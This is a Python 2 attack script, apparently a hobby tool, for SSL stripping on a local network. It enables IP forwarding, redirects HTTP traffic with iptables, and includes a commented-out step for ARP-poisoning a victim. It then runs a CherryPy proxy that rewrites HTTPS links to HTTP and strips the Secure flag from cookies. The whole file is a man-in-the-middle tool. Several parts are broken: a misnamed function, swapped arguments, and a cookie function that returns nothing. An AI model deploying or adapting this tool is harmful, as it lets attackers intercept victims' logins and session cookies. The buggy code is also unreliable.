import os
from scapy.all import *
import time
import requests
import cherrypy

print "                                                               "
print "              _           _        _             _             "
print "      ___ ___| |      ___| |_ _ __(_)_ __  _ __ (_)_ __   __ _ "
print "     / __/ __| |_____/ __| __| '__| | '_ \| '_ \| | '_ \ / _` |"
print "     \__ \__ \ |_____\__ \ |_| |  | | |_) | |_) | | | | | (_| |"
print "     |___/___/_|     |___/\__|_|  |_| .__/| .__/|_|_| |_|\__, |"
print "                                    |_|   |_|            |___/ "
print "                                                               "
print "                              Including secure cookie stripping"
print "                                                               "
print "                                                               "

print "Enabling IP forwarding"
file = open("/proc/sys/net/ipv4/ip_forward", "w")
file.write("1")
file.close()


print "redirecting all http traffic to port 8080"
os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
"""
vIP = raw_input("Victim IP address?")
gatewayIP = raw_input("Gateway IP address?")

file = open("vIP.txt", "w+")
file.write(vIP)
file.close

file = open("gatewayIP.txt", "w+")
file.write(gatewayIP)
file.close

os.system("gnome-terminal -e 'python arpPoison.py'")
"""
print "Wololo"
#Starting the stripping process

def StripHTTPS(url, request):

    # Response message for the victim
    responseVictim = requests.models.Response()

    # reponse message url is equal to provided url
    responseVictim.url = url

    # Set HTTPstatuscode to 200 OK
    responseVictim.status_code = 200


    # Replace HTTPS with HTTPS 
    newURL = str(request.text).replace("HTTPS", "HTTP")
    newURL = str(newURL).replace("https", "http")

    responseVictim._content = newURL.encode('utf-8')

    responseVictim.headers = request.headers
    responseVictim.history = request.history    
    responseVictim.encoding = request.encoding
    responseVictim.reason = request.reason
    responseVictim.elapsed = request.elapsed
    responseVictim.request = request.request

    return responseVictim

def stripSecureCookie(response):
   cookie = response.cookies
   newCookie = str(cookie).replace("Secure;", "")
   response.cookies = newCookie

class sslStripping(object):
    @cherrypy.expose
    def default(self, *route):
        print "hoi"
        url = cherrypy.url()
            
        print url
        print "hoi"

        url = str(url).replace("http", "https")
        
        response = requests.get(url)

        response = stripHTTPS(response, url)

        response = stripSecureCookie(response)

        return response.content

print "Wololo"

if __name__ == '__main__':
    print "Wololo"
    # This command binds cherrypy to all interfaces of this machine, hence it is findable on the network on port 8080
    cherrypy.config.update({'server.socket_host': '0.0.0.0'})
    # This command actually starts the server
    cherrypy.quickstart(sslStripping())
